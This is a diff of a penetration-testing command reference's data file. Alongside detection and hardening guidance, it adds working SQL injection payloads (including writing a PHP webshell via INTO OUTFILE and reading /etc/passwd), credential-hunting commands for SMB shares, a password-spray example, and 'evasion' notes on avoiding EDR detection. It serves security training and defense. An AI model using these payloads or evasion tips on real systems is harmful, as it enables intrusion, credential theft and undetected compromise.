         "impact": "Read sensitive files (creds, configs) and/or write payloads to shares for execution/spread.",
         "detection": "[MITRE T1021.002] SMB tree-connects and file operations (5140/5145 with share auditing); one host touching many shares.",
@@ -63264,7 +66758,9 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "SMB signing disabled (default on workstations) enables NTLM relay attacks — an attacker intercepts NTLMv2 hashes via LLMNR/NBT-NS poisoning and relays them to SMB targets. RCE via SMB requires only a valid local admin credential (or hash). Password spray succeeds when weak/shared passwords exist.",
         "vulnerable_config": "# SMB signing disabled on workstations (Windows default):\nGet-SmbServerConfiguration | Select-Object RequireSecuritySignature\n# RequireSecuritySignature: False  <- relay attacks work\n\n# Any authenticated user can spray:\n# No lockout policy = try one password against 1000 users\n# netexec smb <dc_ip> -u users.txt -p 'Summer2024!' --continue-on-success",
-        "secure_config": "# Enable SMB signing everywhere:\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled\n\n# Disable LLMNR + NBT-NS (see responder card)\n# Account lockout policy: 5 attempts, 30-min window\n# Firewall: block SMB between workstations (allow only to file servers/DCs)"
+        "secure_config": "# Enable SMB signing everywhere:\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled\n\n# Disable LLMNR + NBT-NS (see responder card)\n# Account lockout policy: 5 attempts, 30-min window\n# Firewall: block SMB between workstations (allow only to file servers/DCs)",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir.",
+        "evasion": "Authenticate with valid creds so it blends with normal admin traffic; prefer wmiexec/atexec (no service creation) over psexec's noisy service-install path; avoid touching every host — target only what you need."
       },
       "type": "command"
     },
@@ -63333,7 +66829,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "smbmap -R recursively lists share contents to locate sensitive files across the domain.",
+        "why_it_works": "Share ACLs readable by your account let smbmap recurse the tree and pattern-match filenames for secrets.",
         "prerequisites": "Domain credentials or null/guest access and SMB (445) reachable.",
         "impact": "Located sensitive files within shares.",
         "detection": "SMB tree-connects and share/RID enumeration (Event 5140/5145 with share auditing); anonymous/null binds and RID cycling against the DC.",
@@ -63351,6 +66847,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "smbmap"
+      ],
+      "variations": [
+        {
+          "label": "Search filenames for secrets",
+          "command": "smbmap -u <user> -p <password> -H <target> -R --depth 5 -A '(password|cred|\\.kdbx)'"
+        }
       ]
     },
     {
@@ -63666,6 +67168,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "Snaffler"
+      ],
+      "variations": [
+        {
+          "label": "Target a host list",
+          "command": "Snaffler.exe -s -n <hostlist> -o snaffler.log"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Hunt shares for secrets domain-wide",
+          "command": "Snaffler.exe -s -d <domain> -o snaffler.log -v data"
+        },
+        {
+          "label": "Review high-signal (red) findings",
+          "command": "# grep the log for creds/keys/config files"
+        }
       ]
     },
     {
@@ -63850,10 +67368,6 @@ const COMMAND_DATA = {
       "description": "Walk SNMP with a community string to dump system/device data; brute community strings with onesixtyone, then rapidly walk the OID tree with braa.",
       "variations": [
         {
-          "label": "snmpwalk (public)",
-          "command": "snmpwalk -v2c -c public <ip>"
-        },
-        {
           "label": "onesixtyone - brute community strings",
           "command": "onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <ip>"
         },
@@ -63948,7 +67462,7 @@ const COMMAND_DATA = {
         }
       ],
       "id": "gs-snmp-enum",
-      "name": "SNMP - Enumeration",
+      "name": "SNMP - Enumeration (Getting Started)",
       "command": "snmpwalk -v 2c -c public <ip>",
       "description": "Walk SNMP with a community string to dump device/system info. Try public/private, then brute-force community strings with onesixtyone.",
       "variations": [
@@ -64028,10 +67542,6 @@ const COMMAND_DATA = {
         "T1518"
       ],
       "variations": [
-        {
-          "label": "Windows local user accounts",
-          "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.4.1.77.1.2.25"
-        },
         {
           "label": "Running processes",
           "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2"
@@ -64150,11 +67660,6 @@ const COMMAND_DATA = {
       "description": "Walk the SNMP MIB tree with a validated community string to dump OS, processes, users, installed packages, network interfaces, and routing table.",
       "command": "snmpwalk -c <community> -v2c <ip>",
       "variations": [
-        {
-          "description": "SNMPv2c full walk (preferred where supported)",
-          "command": "snmpwalk -c <community> -v2c <ip>",
-          "label": "SNMP v2c"
-        },
         {
           "description": "SNMPv1 walk with timeout (for slow/legacy targets)",
           "command": "snmpwalk -c <community> -v1 -t 10 <ip>",
@@ -64717,11 +68222,6 @@ const COMMAND_DATA = {
       "description": "Break out of a limited/non-interactive shell into a proper one using any available interpreter or GTFOBins binary - gives job control, tab-completion, and working su/ssh/vim.",
       "variations": [
         {
-          "label": "Python PTY",
-          "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
-          "description": "Python pty upgrade (most reliable — try python3 then python)"
-        },
-        {
           "label": "Interpreters (perl/ruby/lua)",
           "command": "perl -e 'exec \"/bin/sh\";'\nruby -e 'exec \"/bin/sh\"'\nlua -e 'os.execute(\"/bin/sh\")'",
           "description": "Perl / Ruby / Lua exec one-liners (when python unavailable)"
@@ -64770,7 +68270,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Outbound connections from servers are not filtered — any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
         "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows — PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
-        "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows — PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
+        "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows — PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution",
+        "evasion": "Upgrade to a stable PTY quietly; avoid noisy repeated spawns; route through an existing channel."
       }
     },
     {
@@ -65337,7 +68838,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application constructs SQL queries using string concatenation with unsanitized user input — either in the query body or stored procedure arguments. No prepared statements or parameterized queries are used. Additionally, the database user account used by the application has excessive privileges (SELECT/INSERT/UPDATE/DELETE on all tables, or even xp_cmdshell access on MSSQL).",
         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
-        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
+        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
+        "evasion": "Re-disable xp_cmdshell immediately after use; run OS commands sparingly (each spawns sqlservr->cmd, which EDR flags); prefer native SQL for data exfil over shelling out; impersonate rather than adding logins."
       },
       "type": "command"
     },
@@ -65416,7 +68918,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Reads server files through SQL (MSSQL OPENROWSET BULK, MySQL LOAD_FILE) to exfiltrate configs, hashes, or source code.",
+        "why_it_works": "When the DB account has FILE privilege (MySQL) or bulk/OPENROWSET rights (MSSQL), the database engine reads server files on your behalf, turning SQLi into arbitrary file read.",
         "prerequisites": "A SQL session with file-read privileges (bulkadmin / FILE).",
         "impact": "Arbitrary file read on the DB host - credentials, configs, and sensitive data exfiltrated via SQL.",
         "detection": "[MITRE T1005] SQL statements reading filesystem paths (OPENROWSET/LOAD_FILE) in the audit log; unusual file access by the DB service.",
@@ -65428,7 +68930,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application constructs SQL queries using string concatenation with unsanitized user input — either in the query body or stored procedure arguments. No prepared statements or parameterized queries are used. Additionally, the database user account used by the application has excessive privileges (SELECT/INSERT/UPDATE/DELETE on all tables, or even xp_cmdshell access on MSSQL).",
         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
-        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
+        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
+        "evasion": "Re-disable xp_cmdshell immediately after use; run OS commands sparingly (each spawns sqlservr->cmd, which EDR flags); prefer native SQL for data exfil over shelling out; impersonate rather than adding logins."
       },
       "type": "command"
     },
@@ -65501,10 +69004,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "MySQL",
-          "command": "SELECT \"<?php echo shell_exec($_GET['c']);?>\" INTO OUTFILE '/var/www/html/webshell.php';"
-        },
         {
           "label": "MSSQL (Ole Automation)",
           "command": "sp_configure 'show advanced options', 1\nGO\nRECONFIGURE\nGO\nsp_configure 'Ole Automation Procedures', 1\nGO\nRECONFIGURE\nGO\nDECLARE @OLE INT\nDECLARE @FileID INT\nEXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\nEXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1\nEXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET[\"c\"]);?>'\nEXECUTE sp_OADestroy @FileID\nEXECUTE sp_OADestroy @OLE\nGO"
@@ -65637,8 +69136,23 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
+      },
+      "variations": [
+        {
+          "label": "Comment out rest",
+          "command": "admin'-- -"
+        },
+        {
+          "label": "OR true, close paren",
+          "command": "' OR 1=1-- -   |   ') OR ('1'='1"
+        },
+        {
+          "label": "Union to a known password hash",
+          "command": "' UNION SELECT 'admin','<md5_of_known_pw>'-- -"
+        }
+      ]
     },
     {
       "id": "sqli-comments",
@@ -65724,7 +69238,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       }
     },
     {
@@ -65815,8 +69330,19 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
+      },
+      "variations": [
+        {
+          "label": "MSSQL",
+          "command": "cn' UNION select 1,@@version,3,4-- -   # look for 'Microsoft SQL Server'"
+        },
+        {
+          "label": "Postgres",
+          "command": "cn' UNION select 1,version(),3,4-- -"
+        }
+      ]
     },
     {
       "id": "sqli-detect",
@@ -65940,8 +69466,37 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
+      },
+      "variations": [
+        {
+          "label": "Double quote / numeric",
+          "command": "1\"  |  1) OR (1=1"
+        },
+        {
+          "label": "Time-based blind probe",
+          "command": "1' AND SLEEP(5)-- -"
+        },
+        {
+          "label": "Boolean probe",
+          "command": "1' AND 1=1-- -   vs   1' AND 1=2-- -"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Break the query",
+          "command": "'"
+        },
+        {
+          "label": "Confirm injection (error/boolean/time)",
+          "command": "1' AND SLEEP(5)-- -"
+        },
+        {
+          "label": "Move to UNION or blind extraction",
+          "command": "' ORDER BY 1-- -"
+        }
+      ]
     },
     {
       "id": "sqli-user-privs",
@@ -66044,8 +69599,33 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
+      },
+      "variations": [
+        {
+          "label": "Current user + DB",
+          "command": "cn' UNION SELECT 1, concat(user(),' | ',database()), 3, 4-- -"
+        },
+        {
+          "label": "Check FILE privilege (for read/write)",
+          "command": "cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Identify current user",
+          "command": "cn' UNION SELECT 1, user(), 3, 4-- -"
+        },
+        {
+          "label": "Check for FILE/DBA privs",
+          "command": "cn' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user=substring_index(user(),'@',1)-- -"
+        },
+        {
+          "label": "If FILE: read files or write a webshell",
+          "command": "cn' UNION SELECT 1,'<?php system($_GET[0]);?>',3,4 INTO OUTFILE '/var/www/html/s.php'-- -"
+        }
+      ]
     },
     {
       "id": "sqli-union-columns",
@@ -66147,8 +69727,33 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
+      },
+      "variations": [
+        {
+          "label": "UNION NULLs to find column count",
+          "command": "' UNION SELECT NULL,NULL,NULL-- -"
+        },
+        {
+          "label": "Find a string-reflecting column",
+          "command": "' UNION SELECT 1,'INJ',3,4-- -"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Count columns with ORDER BY",
+          "command": "' ORDER BY <n>-- -   # increase until error"
+        },
+        {
+          "label": "Confirm with UNION + find visible column",
+          "command": "cn' UNION select 1,2,3,4-- -"
+        },
+        {
+          "label": "Extract data in the visible column",
+          "command": "cn' UNION SELECT 1,concat(user,':',password),3,4 FROM users-- -"
+        }
+      ]
     },
     {
       "id": "sqli-skills-chain",
@@ -66294,7 +69899,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       }
     },
     {
@@ -66381,8 +69987,19 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
+      },
+      "variations": [
+        {
+          "label": "MySQL LOAD_FILE",
+          "command": "cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -"
+        },
+        {
+          "label": "MSSQL OPENROWSET",
+          "command": "' UNION SELECT 1,(SELECT x FROM OPENROWSET(BULK '<path>',SINGLE_CLOB) R(x)),3,4-- -"
+        }
+      ]
     },
     {
       "id": "sqli-union-enumerate",
@@ -66474,10 +70091,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "List Databases",
-          "command": "cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -"
-        },
-        {
           "label": "Current Database",
           "command": "cn' UNION select 1,database(),2,3-- -"
         },
@@ -66515,7 +70128,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       }
     },
     {
@@ -66616,7 +70230,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "OWASP A03:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "variations": [
         {
@@ -66628,7 +70243,7 @@ const COMMAND_DATA = {
     {
       "id": "sqlmap-csrf-bypass",
       "name": "SQLMap - Anti-CSRF Token Bypass",
-      "command": "sqlmap -u \"http://target.com/\" --data=\"id=1&csrf-token=WfF1...\" --csrf-token=\"csrf-token\" --batch",
+      "command": "sqlmap -u \"http://<target>/\" --data=\"id=1&csrf-token=WfF1...\" --csrf-token=\"csrf-token\" --batch",
       "description": "Handles forms protected by a per-request anti-CSRF token. Name the token parameter with --csrf-token and SQLMap fetches a fresh token before each request automatically, keeping the injection requests valid.",
       "platform": "linux",
       "requires": [
@@ -66705,14 +70320,15 @@ const COMMAND_DATA = {
         "impact": "CSRF protection is completely bypassed for automated SQLi testing — the token adds no security against an attacker who can read the page response (same-origin testing). Any form protected only by CSRF tokens remains SQLi-vulnerable.",
         "detection": "[MITRE T1190] Multiple rapid requests to the same form endpoint where each request fetches the page first (to get the token) before submitting — double-request pattern per test attempt. Token refresh rate far exceeds human interaction speed.",
         "artifacts": "Access log: pairs of GET (token fetch) + POST (payload submit) requests in rapid succession. CSRF token values changing correctly each request (automated refresh).",
-        "prevention": "CSRF tokens are NOT a SQLi control. Use parameterized queries. CSRF protection serves a different purpose (preventing cross-site attacks) and must be maintained alongside SQLi fixes."
+        "prevention": "CSRF tokens are NOT a SQLi control. Use parameterized queries. CSRF protection serves a different purpose (preventing cross-site attacks) and must be maintained alongside SQLi fixes.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-crawl-forms",
       "name": "SQLMap - Auto-find Parameters",
-      "command": "sqlmap -u \"http://target.com/\" --crawl=2 --forms --batch",
+      "command": "sqlmap -u \"http://<target>/\" --crawl=2 --forms --batch",
       "description": "Discovers injectable inputs automatically. --crawl spiders the site to the given depth, --forms parses and submits HTML forms, and -g targets Google dork results. Handy when you do not already know which parameter is vulnerable.",
       "platform": "linux",
       "requires": [
@@ -66792,14 +70408,15 @@ const COMMAND_DATA = {
         "impact": "Automated full-application SQLi assessment — any form field across the entire site is tested. A single missed input field on an internal admin page can lead to full DB compromise.",
         "detection": "[MITRE T1190] Web crawler pattern: rapid sequential requests to many different URLs on the same host. Many unique POST requests to different endpoints in a short window. Crawler-specific behaviour: requesting robots.txt, sitemap.xml, then following links. Default SQLMap user-agent in logs.",
         "artifacts": "Access log: systematic requests to many pages in sequence (application mapping phase), then targeted payload requests to confirmed forms.",
-        "prevention": "robots.txt disallow (minimal protection — tools ignore it). Parameterized queries on all form handlers. Rate limiting per IP. WAF coverage for all form submission endpoints, not just known sensitive ones."
+        "prevention": "robots.txt disallow (minimal protection — tools ignore it). Parameterized queries on all form handlers. Rate limiting per IP. WAF coverage for all form submission endpoints, not just known sensitive ones.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-db-enum",
       "name": "SQLMap - Basic DB Enumeration",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --banner --current-user --current-db --is-dba --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --banner --current-user --current-db --is-dba --batch",
       "description": "Pulls high-level database facts in one pass: version banner, the DB user the app connects as, the current database name, and whether that user has DBA privileges. This is the standard first step after confirming injection.",
       "platform": "linux",
       "requires": [
@@ -66879,14 +70496,15 @@ const COMMAND_DATA = {
         "impact": "DB version fingerprint used to identify unpatched DB vulnerabilities. DBA status unlocks file read/write and OS-level exploitation. Current DB name targets subsequent --dump operations.",
         "detection": "[MITRE T1190] DB audit log: queries accessing mysql.user, CURRENT_USER(), VERSION(), DATABASE() from the web app DB user — unusual for normal application operation. These are metadata queries with no application purpose.",
         "artifacts": "SQLMap output: ~/.sqlmap/output/target/ — DB banner, current user, DBA status saved to text files. DB query log entries for metadata functions.",
-        "prevention": "Parameterized queries eliminate the injection point entirely. Even if somehow reached, least-privilege DB user cannot access mysql.user or super_priv — --is-dba returns false."
+        "prevention": "Parameterized queries eliminate the injection point entirely. Even if somehow reached, least-privilege DB user cannot access mysql.user or super_priv — --is-dba returns false.",
